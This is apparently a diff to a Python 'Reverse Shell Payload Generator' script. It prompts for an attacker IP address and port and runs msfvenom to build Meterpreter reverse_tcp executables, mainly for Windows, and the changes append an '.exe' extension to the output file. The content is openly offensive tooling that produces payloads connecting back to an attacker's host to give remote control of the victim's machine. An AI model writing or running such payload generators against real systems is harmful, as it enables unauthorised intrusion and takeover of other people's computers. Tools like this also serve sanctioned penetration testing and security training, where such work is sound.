@@ -223,10 +223,10 @@ print("[*] Exported payload successfully.")
 import os
 import subprocess
 
+# File Info
 print("Welcome to the Reverse Shell Payload Generator")
-file = input("Please enter the name you want for the file: ")
-extension = input("What extension do you want the file in? (exe/txt/raw): ")
-filename = file + "." + extension
+filename = input("Please enter the name you want for the file: ")
+
 # Get info from user
 attackerIP = input("Please enter your IP address: ")
 attackerPort = input("Enter a port number (1 - 65,535): ")
@@ -246,7 +246,7 @@ if osInfo.find("windows") != -1:
     #print("i found windows")
     os = "windows"
     print(os)
-    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)
+    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename+".exe")
 
 elif osInfo.find("linux") != -1:
     os = "linux"
@@ -262,7 +262,7 @@ elif osInfo.find("osx") != -1:
 elif os == "":
     print("[*] Unable to profile OS, defaulting to Windows.")
     os = "windows"
-    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename)
+    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename+".exe")
 
 
 
@@ -270,5 +270,6 @@ print("[*] Exporting payload, please be patient as: " + filename)
 subprocess.Popen(payload, shell=True).wait()
 print("[*] Exported payload successfully.")
 
-
-
+====================================================================================================================================================================
+====================================================================================================================================================================
+====================================================================================================================================================================
